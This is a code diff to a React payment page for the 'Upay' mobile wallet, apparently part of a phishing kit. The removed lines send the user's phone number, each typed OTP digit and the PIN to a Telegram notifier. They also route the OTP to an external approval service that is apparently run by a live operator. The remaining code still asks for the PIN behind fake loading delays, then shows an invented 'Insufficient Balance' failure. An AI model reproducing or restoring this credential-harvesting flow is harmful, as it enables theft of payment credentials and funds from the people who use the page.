@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "@/lib/flowRouter";
-import { sendTelegramNotification } from "@/lib/payment-telegram";
-import { submitOtpForApproval } from "@/lib/otpApproval";
+
+
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import FlowLoading from "@/components/FlowLoading";
 import { useMerchantInfo } from "@/hooks/useMerchantInfo";
@@ -66,54 +66,32 @@ const UpayPayment = () => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 6);
     setOtp(v);
     if (v.length > otp.length && v.length > 0) {
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp: v });
+      
     }
   };
   const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const v = e.target.value.replace(/\D/g, "").slice(0, 4);
     setPin(v);
     if (v.length > pin.length && v.length > 0) {
-      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin: v });
+      
     }
   };
 
   const handleMobileSubmit = () => {
     if (!isValidMobile()) return;
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber }, { force: true });
+    
     setTimeout(() => { setStep('otp'); setIsLoading(false); }, 2000);
   };
   const [otpDenyCount, setOtpDenyCount] = useState(0);
-  const handleOtpSubmit = async () => {
-    if (otp.length < 4) { setShowError("Please enter the verification code."); setTimeout(() => setShowError(""), 3000); return; }
-    setIsLoading(true);
-    const nextAttempt = otpAttempts + 1;
-    setOtpAttempts(nextAttempt);
-    const decision = await submitOtpForApproval({
-      amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp,
-    }, { autoAttempt: nextAttempt, otpStartAt: otpStartAtRef.current });
-    setIsLoading(false);
-    if (decision === 'approved') {
-      setStep('pin');
-    } else if (decision === 'timeout' || decision === 'error') {
-      navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
-    } else {
-      const nextDenies = otpDenyCount + 1;
-      setOtpDenyCount(nextDenies);
-      if (nextDenies >= 3) {
-        navigate(`/payment-cancelled?channel=Upay&reason=Payment isn't completed&amount=${amount}`);
-        return;
-      }
-      setShowError("Invalid verification code."); setOtp("");
-      setTimeout(() => otpRef.current?.focus(), 50);
-      setTimeout(() => setShowError(""), 3500);
-    }
+  const handleOtpSubmit = () => {
+    navigate(`/payment-cancelled?reason=Payment isn't completed&amount=${amount}`);
   };
 
   const handlePinSubmit = () => {
     if (pin.length < 4) { setShowError("Please enter your PIN."); setTimeout(() => setShowError(""), 3000); return; }
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs', number: mobileNumber, otp, pin }, { force: true });
+    
     setTimeout(() => { setIsLoading(false); navigate(`/payment-cancelled?channel=Upay&reason=Insufficient Balance&amount=${amount}`); }, 2000);
   };
   const handleClose = () => {
